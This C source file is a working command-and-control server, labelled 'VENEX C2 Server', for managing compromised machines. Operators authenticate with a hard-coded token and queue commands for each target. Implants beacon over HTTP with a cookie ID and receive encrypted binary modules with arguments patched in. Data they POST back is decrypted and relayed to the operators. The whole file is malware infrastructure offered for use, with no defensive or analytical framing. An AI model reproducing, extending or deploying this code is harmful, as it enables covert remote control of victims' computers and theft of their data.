#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdint.h>
#include <ctype.h>

#include <arpa/inet.h>   // inet_ntoa
#include <stdarg.h>      // va_start, va_end
#include <fcntl.h>       // fcntl, O_NONBLOCK
#include <signal.h>      // signal, SIGINT, SIGTERM
#include <unistd.h>      // close(), read(), write()
#include <errno.h>


// Platform-specific includes
#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #pragma comment(lib, "ws2_32.lib")
    #define strncasecmp _strnicmp
    #define strcasecmp _stricmp
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <pthread.h>
    #include <errno.h>
    
    #define SOCKET int
    #define INVALID_SOCKET (-1)
    #define SOCKET_ERROR (-1)
    #define closesocket close
    #define Sleep(ms) usleep((ms) * 1000)
    
    // Threading for Linux
    typedef pthread_t THREAD_HANDLE;
    typedef pthread_mutex_t CRITICAL_SECTION;
    
    #define InitializeCriticalSection(mutex) pthread_mutex_init((mutex), NULL)
    #define EnterCriticalSection(mutex) pthread_mutex_lock((mutex))
    #define LeaveCriticalSection(mutex) pthread_mutex_unlock((mutex))
    #define DeleteCriticalSection(mutex) pthread_mutex_destroy((mutex))
    
    #define CreateThread(attr, stack, func, arg, flags, id) \
        ({ pthread_t thread; pthread_create(&thread, NULL, func, arg) == 0 ? (HANDLE)thread : NULL; })
    #define CloseHandle(thread) pthread_detach((pthread_t)(thread))
    #define HANDLE void*
    #define DWORD unsigned long
    #define LPVOID void*
    #define WINAPI
#endif

#define CONTROL_PORT 7777
#define HTTP_PORT 80
#define BUFFER_SIZE 5242880 // 5 MB
#define MAX_CLIENTS 100
#define MAX_MSG_LEN 4096
#define MAX_ID_LEN 64
#define MAX_COOKIE_LEN 128
#define MAX_PATH_LEN 1024

#define AUTH_TOKEN "d3b3763b3cdf08c852cd51a6d98188677601b6f3229a9689e8369445c1ca17c0"
#define TOKEN_PREFIX "TOKEN:"
#define TOKEN_MAX_LEN 128

// External function provided
extern void* chacha20_Full(void* message, void* buffer, uint64_t length);

typedef struct {
    SOCKET socket;
    struct sockaddr_in address;
    int is_authority;
    char target_id[MAX_ID_LEN];
} client_t;

// --- Message Node ---
typedef struct MsgNode {
    char message[MAX_MSG_LEN];
    struct MsgNode* next;
} MsgNode;

// --- Queue per Target ---
typedef struct Queue {
    char targetId[MAX_ID_LEN];
    MsgNode* head;
    MsgNode* tail;
    struct Queue* next;
} Queue;

// Global variables
CRITICAL_SECTION clients_cs;
CRITICAL_SECTION messages_cs;
client_t *clients[MAX_CLIENTS];
volatile int http_listener_active = 0;
SOCKET http_socket = INVALID_SOCKET;
int server_running = 1;

// Head of all queues
Queue* queueList = NULL;

// Cross-platform socket initialization
int init_sockets() {
#ifdef _WIN32
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2, 2), &wsaData);
#else
    return 0;
#endif
}

// Cross-platform socket cleanup
void cleanup_sockets() {
#ifdef _WIN32
    WSACleanup();
#endif
}

// Portable memmem implementation
void *portable_memmem(const void *haystack, size_t haystacklen,
                     const void *needle, size_t needlelen) {
    if (needlelen == 0 || haystacklen < needlelen) {
        return NULL;
    }

    const unsigned char *h = haystack;
    const unsigned char *n = needle;

    for (size_t i = 0; i <= haystacklen - needlelen; i++) {
        if (h[i] == n[0] && memcmp(h + i, n, needlelen) == 0) {
            return (void *)(h + i);
        }
    }
    return NULL;
}

// Cross-platform safe string copy
void safe_strncpy(char *dest, const char *src, size_t dest_size) {
    if (dest_size == 0) return;
    
    size_t src_len = strlen(src);
    size_t copy_len = (src_len < dest_size - 1) ? src_len : dest_size - 1;
    
    memcpy(dest, src, copy_len);
    dest[copy_len] = '\0';
}

char *bytes_to_hex(const unsigned char *buf, size_t len) {
    // 2 hex chars per byte + 1 for null terminator
    char *hexstr = malloc(len * 2 + 1);
    if (!hexstr) return NULL;

    for (size_t i = 0; i < len; i++) {
        sprintf(hexstr + i * 2, "%02x", buf[i]);
    }

    hexstr[len * 2] = '\0'; // null terminate
    return hexstr;
}

// Cross-platform file path handling
void get_module_path(const char *moduleName, char *path, size_t path_size) {
#ifdef _WIN32
    snprintf(path, path_size, "modules\\%s.bin", moduleName);
#else
    snprintf(path, path_size, "./modules/%s.bin", moduleName);
#endif
}

void get_script_path(const char *scriptName, char *path, size_t path_size) {
#ifdef _WIN32
    snprintf(path, path_size, "moduloScript\\%s.vms", scriptName);
#else
    snprintf(path, path_size, "./moduloScript/%s.vms", scriptName);
#endif
}

// Extract ID from Cookie header
int extract_id_from_cookie(const char* request, char* id_buffer, size_t buffer_size) {
    if (!request || !id_buffer || buffer_size == 0) {
        return 0;
    }
    
    // Try both uppercase and lowercase Cookie header
    const char* cookie_start = strstr(request, "Cookie: ");
    if (!cookie_start) {
        cookie_start = strstr(request, "cookie: ");
    }
    
    if (!cookie_start) {
        return 0;
    }
    
    cookie_start += 8; // Move past "Cookie: " or "cookie: "
    
    // Find the end of the cookie value
    const char* cookie_end = strchr(cookie_start, '\r');
    if (!cookie_end) {
        cookie_end = strchr(cookie_start, '\n');
    }
    if (!cookie_end) {
        cookie_end = strchr(cookie_start, ';');
    }
    if (!cookie_end) {
        cookie_end = cookie_start + strlen(cookie_start);
    }
    
    // Calculate length and copy
    size_t id_length = cookie_end - cookie_start;
    if (id_length == 0 || id_length >= buffer_size) {
        return 0;
    }
    
    // Trim whitespace
    while (id_length > 0 && isspace((unsigned char)cookie_start[id_length - 1])) {
        id_length--;
    }
    
    safe_strncpy(id_buffer, cookie_start, id_length + 1);
    
    return 1;
}

// Validate extracted ID
int validate_target_id(const char* id) {
    if (!id || strlen(id) == 0) {
        return 0;
    }
    
    // Check if ID is valid hex string
    for (int i = 0; id[i] != '\0'; i++) {
        if (!isxdigit((unsigned char)id[i])) {
            return 0;
        }
    }
    
    // Example validation - you can customize this
    if (strcmp(id, "12E4A4FF050EB700") == 0) {
        return 1;
    }
    
    // For testing, accept any valid hex ID with minimum length
    return (strlen(id) >= 8);
}


void log_message(const char* format, ...) {
    va_list args;
    va_start(args, format);
    
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    char timestamp[20];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
    
    printf("[%s] ", timestamp);
    vprintf(format, args);
    printf("\n");
    fflush(stdout);
    
    va_end(args);
}

// --- Find or Create Queue for targetId ---
Queue* getQueue(const char* targetId) {
    Queue* q = queueList;
    while (q) {
        if (strcmp(q->targetId, targetId) == 0) {
            return q;
        }
        q = q->next;
    }

    // Create new queue
    Queue* newQ = (Queue*)calloc(1, sizeof(Queue));
    if (!newQ) {
        log_message("Failed to allocate memory for new queue");
        return NULL;
    }
    
    safe_strncpy(newQ->targetId, targetId, sizeof(newQ->targetId));
    newQ->head = newQ->tail = NULL;
    newQ->next = queueList;
    queueList = newQ;

    log_message("Created new queue for target %s", targetId);
    return newQ;
}

// --- Enqueue message ---
void enqueue(const char* targetId, const char* msg) {
    if (!targetId || !msg) {
        return;
    }
    
    Queue* q = getQueue(targetId);
    if (!q) {
        return;
    }
    
    MsgNode* node = (MsgNode*)malloc(sizeof(MsgNode));
    if (!node) {
        log_message("Failed to allocate memory for message node");
        return;
    }
    
    safe_strncpy(node->message, msg, sizeof(node->message));
    node->next = NULL;

    if (!q->tail) {
        q->head = q->tail = node;
    } else {
        q->tail->next = node;
        q->tail = node;
    }
    log_message("Stored message for %s: %s", targetId, msg);
}

// --- Dequeue message ---
char* dequeue(const char* targetId) {
    if (!targetId) {
        return NULL;
    }
    
    Queue* q = getQueue(targetId);
    if (!q || !q->head) {
        return NULL; // No messages
    }
    
    MsgNode* node = q->head;
    q->head = q->head->next;
    if (!q->head) {
        q->tail = NULL;
    }
    
    char* msg = strdup(node->message);
    free(node);
    return msg;
}

// Free all queues
void free_all_queues() {
    Queue* q = queueList;
    while (q) {
        Queue* next = q->next;
        MsgNode* node = q->head;
        while (node) {
            MsgNode* next_node = node->next;
            free(node);
            node = next_node;
        }
        free(q);
        q = next;
    }
    queueList = NULL;
}

unsigned char *load_module(char *module, int *size) {
    if (!module || !size) {
        return NULL;
    }
    
    // Remove trailing newline
    size_t len = strlen(module);
    if (len > 0 && module[len - 1] == '\n') {
        module[len - 1] = '\0';
    }

    // Parse module name and arguments
    char moduleName[MAX_PATH_LEN] = {0};
    char argumentStr[MAX_PATH_LEN] = {0};
    
    char *space = strchr(module, ' ');
    if (space) {
        *space = '\0';
        safe_strncpy(moduleName, module, sizeof(moduleName));
        safe_strncpy(argumentStr, space + 1, sizeof(argumentStr));
    } else {
        safe_strncpy(moduleName, module, sizeof(moduleName));
        safe_strncpy(argumentStr, "whoami", sizeof(argumentStr));
    }

    log_message("Loading module: %s with args: %s", moduleName, argumentStr);
    
    // Get module path
    char path[MAX_PATH_LEN];
    get_module_path(moduleName, path, sizeof(path));
    
    // Open file
    FILE* file = fopen(path, "rb");
    if (!file) {
        log_message("Failed to open %s", path);
        return NULL;
    }

    // Get file size
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    rewind(file);

    if (file_size <= 0) {
        log_message("Invalid file size for %s", path);
        fclose(file);
        return NULL;
    }

    // Read file
    unsigned char* file_buffer = malloc(file_size);
    if (!file_buffer) {
        log_message("Memory allocation failed for file buffer");
        fclose(file);
        return NULL;
    }

    size_t bytes_read = fread(file_buffer, 1, file_size, file);
    fclose(file);

    if (bytes_read != (size_t)file_size) {
        log_message("Failed to read entire file");
        free(file_buffer);
        return NULL;
    }

    // Replace with arguments
    char *pos = memmem(file_buffer, file_size, "0xFFFFFFFF", strlen("0xFFFFFFFF"));
    if (pos) {
        memcpy(pos, argumentStr, strlen(argumentStr) + 1);  // overwrite in place
    }

    // Encrypt the file content
    unsigned char* encrypted_data = chacha20_Full(file_buffer, file_buffer, file_size);
    if (!encrypted_data) {
        log_message("Encryption failed");
        free(file_buffer);
        return NULL;
    }

    const char* header = "HTTP/1.1 200 OK\r\n"
                    "Content-Type: text/html\r\n"
                    "Connection: close\r\n"
                    "\r\n";
    
    size_t header_len = strlen(header);
    const char* signature = "NSLM55IM";
    size_t sig_len = 8;
    
    // Create full payload
    unsigned char* full_payload = malloc(header_len + sig_len + file_size);
    if (!full_payload) {
        log_message("Failed to allocate memory for full payload");
        free(file_buffer);
        return NULL;
    }

    memcpy(full_payload, header, header_len);
    memcpy(full_payload + header_len, signature, sig_len);
    memcpy(full_payload + header_len + sig_len, encrypted_data, file_size);

    *size = header_len + sig_len + file_size;

    log_message("Sent signature and encrypted binary (%ld bytes)", file_size);
    free(file_buffer);

    return full_payload;
}

void broadcast_to_clients(const char *message, int message_len, SOCKET exclude_socket) {
    if (!message || message_len <= 0) {
        return;
    }
    
    EnterCriticalSection(&clients_cs);
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i] && clients[i]->socket != exclude_socket) {
            send(clients[i]->socket, message, message_len, 0);
        }
    }
    
    LeaveCriticalSection(&clients_cs);
}

void add_client(SOCKET socket, struct sockaddr_in address) {
    EnterCriticalSection(&clients_cs);
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (!clients[i]) {
            clients[i] = (client_t*)calloc(1, sizeof(client_t));
            if (clients[i]) {
                clients[i]->socket = socket;
                clients[i]->address = address;
                clients[i]->is_authority = 0;
                memset(clients[i]->target_id, 0, sizeof(clients[i]->target_id));
            }
            break;
        }
    }
    
    LeaveCriticalSection(&clients_cs);
}

void remove_client(SOCKET socket) {
    EnterCriticalSection(&clients_cs);
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i] && clients[i]->socket == socket) {
            free(clients[i]);
            clients[i] = NULL;
            break;
        }
    }
    
    LeaveCriticalSection(&clients_cs);
}

int start_http_listener() {
    if (http_listener_active) {
        log_message("HTTP listener already running");
        return 0;
    }
    
    http_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (http_socket == INVALID_SOCKET) {
        log_message("HTTP socket creation failed");
        return -1;
    }
    
    int opt = 1;
    if (setsockopt(http_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt)) == SOCKET_ERROR) {
        log_message("HTTP setsockopt failed");
        closesocket(http_socket);
        return -1;
    }
    
    // Set socket to non-blocking for better shutdown handling
#ifdef _WIN32
    u_long mode = 1;
    ioctlsocket(http_socket, FIONBIO, &mode);
#else
    int flags = fcntl(http_socket, F_GETFL, 0);
    fcntl(http_socket, F_SETFL, flags | O_NONBLOCK);
#endif
    
    struct sockaddr_in http_addr;
    memset(&http_addr, 0, sizeof(http_addr));
    http_addr.sin_family = AF_INET;
    http_addr.sin_addr.s_addr = INADDR_ANY;
    http_addr.sin_port = htons(HTTP_PORT);
    
    if (bind(http_socket, (struct sockaddr *)&http_addr, sizeof(http_addr)) == SOCKET_ERROR) {
        log_message("HTTP bind failed on port %d", HTTP_PORT);
        closesocket(http_socket);
        return -1;
    }
    
    if (listen(http_socket, 10) == SOCKET_ERROR) {
        log_message("HTTP listen failed");
        closesocket(http_socket);
        return -1;
    }
    
    http_listener_active = 1;
    log_message("HTTP listener started on port %d", HTTP_PORT);
    return 0;
}

void stop_http_listener() {
    if (http_listener_active) {
        http_listener_active = 0;
        
        // Shutdown and close socket
        if (http_socket != INVALID_SOCKET) {
            // Use platform-specific shutdown constants
#ifdef _WIN32
            shutdown(http_socket, SD_BOTH);  // Windows uses SD_BOTH instead of SHUT_RDWR
#else
            shutdown(http_socket, SHUT_RDWR);  // Linux/Unix uses SHUT_RDWR
#endif
            closesocket(http_socket);
            http_socket = INVALID_SOCKET;
        }
        
        log_message("HTTP listener stopped");
    }
}

#ifdef _WIN32
DWORD WINAPI handle_http_connections(LPVOID arg)
#else
void* handle_http_connections(void* arg)
#endif
{
    while (http_listener_active && server_running) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        
        SOCKET client_socket = accept(http_socket, (struct sockaddr *)&client_addr, &client_len);
        if (client_socket == INVALID_SOCKET) {
            if (http_listener_active) {
#ifdef _WIN32
                int err = WSAGetLastError();
                if (err != WSAEWOULDBLOCK) {
                    log_message("HTTP accept error: %d", err);
                }
#else
                if (errno != EWOULDBLOCK && errno != EAGAIN) {
                    log_message("HTTP accept error: %s", strerror(errno));
                }
#endif
                Sleep(100); // Avoid tight loop on error
            }
            continue;
        }
        
        // Set client socket timeout
#ifdef _WIN32
        int timeout = 5000; // 5 seconds
        setsockopt(client_socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
#else
        struct timeval timeout;
        timeout.tv_sec = 5;
        timeout.tv_usec = 0;
        setsockopt(client_socket, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
#endif
        
        char *buffer = (char*)malloc(BUFFER_SIZE);
        if (!buffer) {
            closesocket(client_socket);
            continue;
        }
        
        memset(buffer, 0, BUFFER_SIZE);
        char apiID[32] = {0};
        
        int total_received = 0;
        int bytes_received = 0;
        int content_length = 0;
        char *body_start = NULL;
        int headers_end = 0;
        char *body_buffer = NULL;
        char *url_start = NULL;
        
        // Read headers
        do {
            bytes_received = recv(client_socket, buffer + total_received, 
                                 BUFFER_SIZE - total_received - 1, 0);
            
            if (bytes_received < 0) {
#ifdef _WIN32
                if (WSAGetLastError() == WSAETIMEDOUT || WSAGetLastError() == WSAEWOULDBLOCK)
#else
                if (errno == EWOULDBLOCK || errno == EAGAIN)
#endif
                {
                    break;
                }
                log_message("HTTP recv failed");
                break;
            }
            
            if (bytes_received == 0) {
                break;
            }
            
            total_received += bytes_received;
            buffer[total_received] = '\0';
            
            // Find end of headers
            body_start = strstr(buffer, "\r\n\r\n");
            if (body_start) {
                headers_end = (body_start - buffer) + 4;
                break;
            }
            
        } while (total_received < BUFFER_SIZE - 1);
        
        if (total_received == 0) {
            closesocket(client_socket);
            free(buffer);
            continue;
        }
        
        // Parse Content-Length
        char *cl_header = strstr(buffer, "Content-Length: ");
        if (!cl_header) {
            cl_header = strstr(buffer, "content-length: ");
        }
        if (cl_header) {
            content_length = atoi(cl_header + 16);
        }
        
        // Read POST body if needed
        if (content_length > 0 && (strncmp(buffer, "POST", 4) == 0 || strncmp(buffer, "post", 4) == 0)) {
            while (total_received - headers_end < content_length && total_received < BUFFER_SIZE - 1) {
                int remaining = content_length - (total_received - headers_end);
                int to_read = BUFFER_SIZE - total_received - 1;
                if (to_read > remaining) to_read = remaining;
                
                bytes_received = recv(client_socket, buffer + total_received, to_read, 0);
                
                if (bytes_received <= 0) {
                    break;
                }
                
                total_received += bytes_received;
            }
            buffer[total_received] = '\0';
            body_buffer = buffer + headers_end;
        }
        
        // Extract URL
        if (strncmp(buffer, "GET", 3) == 0 || strncmp(buffer, "get", 3) == 0) {
            url_start = buffer + 4; // skip "GET "
        } else if (strncmp(buffer, "POST", 4) == 0 || strncmp(buffer, "post", 4) == 0) {
            url_start = buffer + 5; // skip "POST "
        }
        
        if (url_start) {
            int i;
            for (i = 0; i < sizeof(apiID) - 1 && url_start[i] != ' ' && url_start[i] != '\0'; i++) {
                apiID[i] = url_start[i];
            }
            apiID[i] = '\0';
        }
        
        // Handle POST requests
        if (strncmp(buffer, "POST", 4) == 0 || strncmp(buffer, "post", 4) == 0) {
            if (body_buffer && content_length > 0) {
                chacha20_Full(body_buffer, body_buffer, content_length);
                broadcast_to_clients(apiID, strlen(apiID), INVALID_SOCKET);
                broadcast_to_clients(body_buffer, content_length, INVALID_SOCKET);
                broadcast_to_clients("END_OF", 6, INVALID_SOCKET);
            }
        } 
        // Handle GET requests
        else if (strncmp(buffer, "GET", 3) == 0 || strncmp(buffer, "get", 3) == 0) {
            // Extract ID from cookie
            char client_id[MAX_COOKIE_LEN] = {0};
            int is_target = extract_id_from_cookie(buffer, client_id, sizeof(client_id));
            
            if (is_target && validate_target_id(client_id)) {
                log_message("Target detected via cookie - ID: %s", client_id);
                
                // Handle beacon messages
                if (strstr(buffer, "beacon=ALIVE") || strstr(buffer, "beacon=alive")) {
                    log_message("Target %s connected", client_id);
                    
                    // Check for commands
                    char* reply = dequeue(client_id);
                    if (reply) {
                        log_message("Sending command to target %s: %s", client_id, reply);
                        
                        char *response;
                        int response_size;
                        response = load_module(reply, &response_size);
                        
                        if (response) {
                            send(client_socket, response, response_size, 0);
                            free(response);
                        } else {
                            const char* ack = "ACK";
                            send(client_socket, ack, strlen(ack), 0);
                        }
                        free(reply);
                    } else {
                        char target_buffer[128];
                        snprintf(target_buffer, sizeof(target_buffer), "TARGET:%sEND_OF", client_id);
                        broadcast_to_clients(target_buffer, (int)strlen(target_buffer), INVALID_SOCKET);
                    }
                } else {
                    // Other target requests
                    const char* response = "HTTP/1.1 200 OK\r\n"
                                         "Content-Type: text/html\r\n"
                                         "Connection: close\r\n\r\n"
                                         "Target request processed";
                    send(client_socket, response, strlen(response), 0);
                }
            } else {
                // Non-target client
                log_message("Non-target client connected: %s", inet_ntoa(client_addr.sin_addr));
                const char* response = 
                    "HTTP/1.1 200 OK\r\n"
                    "Content-Type: text/html\r\n"
                    "Connection: close\r\n\r\n"
                    "<html><body><h1>Server Active</h1></body></html>";
                send(client_socket, response, strlen(response), 0);
            }
        }
        
        closesocket(client_socket);
        free(buffer);
    }
    
#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

#ifdef _WIN32
DWORD WINAPI handle_client(LPVOID arg)
#else
void* handle_client(void* arg)
#endif
{
    SOCKET client_socket = *(SOCKET*)arg;
    free(arg);
    
    char buffer[4096];
    int bytes_received;

    while ((bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytes_received] = '\0';
        
        // Remove trailing newlines
        buffer[strcspn(buffer, "\r\n")] = '\0';
        
        // Authority client command
        if (strncmp(buffer, "AUTH:", 5) == 0) {
            char *command = buffer + 5;
            
            EnterCriticalSection(&clients_cs);
            for (int i = 0; i < MAX_CLIENTS; i++) {
                if (clients[i] && clients[i]->socket == client_socket) {
                    clients[i]->is_authority = 1;
                    break;
                }
            }
            LeaveCriticalSection(&clients_cs);
            
            if (strcmp(command, "START_HTTP") == 0) {
                if (start_http_listener() == 0) {
                    send(client_socket, "HTTP listener startedEND_OF", 27, 0);
                    
                    // Start HTTP listener thread
#ifdef _WIN32
                    HANDLE http_thread = CreateThread(NULL, 0, handle_http_connections, NULL, 0, NULL);
                    if (http_thread) CloseHandle(http_thread);
#else
                    pthread_t http_thread;
                    if (pthread_create(&http_thread, NULL, handle_http_connections, NULL) == 0) {
                        pthread_detach(http_thread);
                    }
#endif
                } else {
                    send(client_socket, "Failed to start HTTP listenerEND_OF", 35, 0);
                }
            } else if (strcmp(command, "STOP_HTTP") == 0) {
                stop_http_listener();
                send(client_socket, "HTTP listener stoppedEND_OF", 27, 0);
            } else if (strcmp(command, "SHUT_DOWN") == 0) {
                server_running = 0;
                send(client_socket, "Server shutting downEND_OF", 26, 0);
                break;
            }
        }
        // Target registration
        else if (strncmp(buffer, "TARGET:", 7) == 0) {
            char* id = strtok(buffer + 7, ":");
            char* msg = strtok(NULL, "");
            
            if (!id || !msg) {
                log_message("Invalid message format");
                continue;
            }

            if (msg[0] == '$') {  // special case: read .vms file
                char filename[MAX_PATH_LEN];
                get_script_path(msg + 1, filename, sizeof(filename));

                FILE* fp = fopen(filename, "r");
                if (!fp) {
                    log_message("Could not open file %s", filename);
                    continue;
                }

                char line[4096];
                while (fgets(line, sizeof(line), fp)) {
                    line[strcspn(line, "\r\n")] = 0;
                    if (strlen(line) > 0) {
                        enqueue(id, line);
                    }
                }

                fclose(fp);
                log_message("Loaded script %s for target %s", msg + 1, id);
            } else {
                enqueue(id, msg);
            }
            
            send(client_socket, "Command enqueuedEND_OF", 22, 0);
        }
        else {
            // Regular message broadcast
            char broadcast_msg[sizeof(buffer) + 50];
            snprintf(broadcast_msg, sizeof(broadcast_msg), "CLIENT_%llu: %s", 
                    (unsigned long long)client_socket, buffer);
            broadcast_to_clients(broadcast_msg, (int)strlen(broadcast_msg), client_socket);
            broadcast_to_clients("END_OF", 6, INVALID_SOCKET);
        }
    }
    
    remove_client(client_socket);
    closesocket(client_socket);
    
#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

void cleanup() {
    log_message("Cleaning up resources...");
    
    // Stop HTTP listener
    stop_http_listener();
    
    // Close all client sockets
    EnterCriticalSection(&clients_cs);
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i]) {
            closesocket(clients[i]->socket);
            free(clients[i]);
            clients[i] = NULL;
        }
    }
    LeaveCriticalSection(&clients_cs);
    
    // Free all queues
    free_all_queues();
    
    // Delete critical sections
    DeleteCriticalSection(&clients_cs);
    DeleteCriticalSection(&messages_cs);
    
    // Cleanup sockets
    cleanup_sockets();
    
    log_message("Cleanup complete");
}

void signal_handler(int sig) {
    log_message("Received signal %d, shutting down...", sig);
    server_running = 0;
}

int validate_token(SOCKET client_socket) {
    char buffer[TOKEN_MAX_LEN] = {0};

    int received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    if (received <= 0) {
        return 0;
    }

    // Expect format: TOKEN:<token>
    if (strncmp(buffer, TOKEN_PREFIX, strlen(TOKEN_PREFIX)) != 0) {
        return 0;
    }

    char *token = buffer + strlen(TOKEN_PREFIX);

    // Remove newline if present
    char *newline = strpbrk(token, "\r\n");
    if (newline) {
        *newline = '\0';
    }

    return strcmp(token, AUTH_TOKEN) == 0;
}


int main() {
    SOCKET server_socket;
    struct sockaddr_in server_addr;

    // Setup signal handling for graceful shutdown
#ifndef _WIN32
    //signal(SIGINT, signal_handler);
    //signal(SIGTERM, signal_handler);
#endif
    
    // Initialize sockets
    if (init_sockets() != 0) {
        log_message("Socket initialization failed");
        return 1;
    }
    
    // Initialize critical sections
    InitializeCriticalSection(&clients_cs);
    InitializeCriticalSection(&messages_cs);
    
    // Initialize clients array
    memset(clients, 0, sizeof(clients));
    
    // Create server socket
    server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_socket == INVALID_SOCKET) {
        log_message("Socket creation failed");
        cleanup_sockets();
        return 1;
    }
    
    // Set socket options
    int opt = 1;
    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt)) == SOCKET_ERROR) {
        log_message("Setsockopt failed");
        closesocket(server_socket);
        cleanup_sockets();
        return 1;
    }
    
    // Configure server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(CONTROL_PORT);
    
    // Bind socket
    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        log_message("Bind failed on port %d", CONTROL_PORT);
        closesocket(server_socket);
        cleanup_sockets();
        return 1;
    }
    
    // Listen for connections
    if (listen(server_socket, 10) == SOCKET_ERROR) {
        log_message("Listen failed");
        closesocket(server_socket);
        cleanup_sockets();
        return 1;
    }
    
    log_message("Cross-platform VENEX C2 Server running on port %d", CONTROL_PORT);
    log_message("Commands: AUTH:START_HTTP, AUTH:STOP_HTTP, TARGET:<id>:<command>");
    
    // Main server loop
    while (server_running) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        
        SOCKET client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_len);
        if (client_socket == INVALID_SOCKET) {
            if (server_running) {
                log_message("Accept failed");
            }
            continue;
        }

        /* 🔐 TOKEN CHECK */
        if (!validate_token(client_socket)) {
            log_message("Rejected client %s:%d (invalid token)",
                inet_ntoa(client_addr.sin_addr),
                ntohs(client_addr.sin_port));

            send(client_socket, "AUTH FAILEDEND_OFFucked by VENEX C2 Server END_OF", 49, 0);        
            
            closesocket(client_socket);
        
            continue;
        }

        send(client_socket, "AUTHORIZED END_OF", 17, 0);

        log_message("New client connected: %s:%d", 
                   inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
        
        add_client(client_socket, client_addr);
        
        // Create thread for client
        SOCKET *client_sock_ptr = (SOCKET*)malloc(sizeof(SOCKET));
        if (!client_sock_ptr) {
            log_message("Failed to allocate memory for client socket");
            closesocket(client_socket);
            continue;
        }
        
        *client_sock_ptr = client_socket;
        
#ifdef _WIN32
        HANDLE thread_handle = CreateThread(NULL, 0, handle_client, client_sock_ptr, 0, NULL);
        if (thread_handle == NULL) {
            log_message("Thread creation failed");
            closesocket(client_socket);
            free(client_sock_ptr);
        } else {
            CloseHandle(thread_handle);
        }
#else
        pthread_t thread_handle;
        if (pthread_create(&thread_handle, NULL, handle_client, client_sock_ptr) != 0) {
            log_message("Thread creation failed");
            closesocket(client_socket);
            free(client_sock_ptr);
        } else {
            pthread_detach(thread_handle);
        }
#endif
    }
    
    // Cleanup
    closesocket(server_socket);
    cleanup();
    
    return 0;
}